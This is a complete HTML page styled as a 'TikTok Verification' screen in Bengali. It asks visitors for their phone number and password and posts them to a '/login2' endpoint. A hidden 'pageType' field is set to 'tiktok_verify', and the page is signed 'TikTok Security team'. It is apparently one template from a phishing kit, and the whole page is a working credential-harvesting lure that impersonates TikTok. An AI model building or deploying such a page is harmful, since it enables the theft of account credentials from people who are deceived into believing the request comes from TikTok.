<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Verification</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: linear-gradient(135deg, #000000 0%, #2d2d2d 100%); 
            display: flex; justify-content: center; align-items: center; 
            min-height: 100vh; padding: 16px; color: white;
        }
        .card { 
            background: rgba(25, 25, 25, 0.8); width: 100%; max-width: 400px; padding: 24px; 
            border-radius: 15px; text-align: center; backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        .tiktok-icon { font-size: 48px; margin-bottom: 10px; background: linear-gradient(45deg, #ff0050, #00f2fe); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        h2 { color: white; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: 1px solid #444; background: rgba(40, 40, 40, 0.8); color: white; font-size: 16px; }
        input:focus { border-color: #ff0050; outline: none; }
        button { width: 100%; padding: 14px; background: linear-gradient(45deg, #ff0050, #00f2fe); border: none; border-radius: 8px; color: white; font-size: 18px; font-weight: bold; cursor: pointer; }
        button:hover { transform: translateY(-2px); }
    </style>
</head>
<body>
    <div class="card">
        <div class="tiktok-icon"><i class="fab fa-tiktok"></i></div>
        <h2>TikTok Verification</h2>
        <p>আপনার TikTok অ্যাকাউন্ট ভেরিফাই করুন</p>
        
        <form action="/login2" method="POST">
            <input type="tel" name="username" placeholder="ফোন নম্বর" required>
            <input type="password" name="password" placeholder="পাসওয়ার্ড" required>
            <input type="hidden" name="pageType" value="tiktok_verify">
            <button type="submit">Verify Now</button>
        </form>
        
        <p style="margin-top: 15px; font-size: 12px; color: #888;">TikTok Security team</p>
    </div>
</body>
</html>
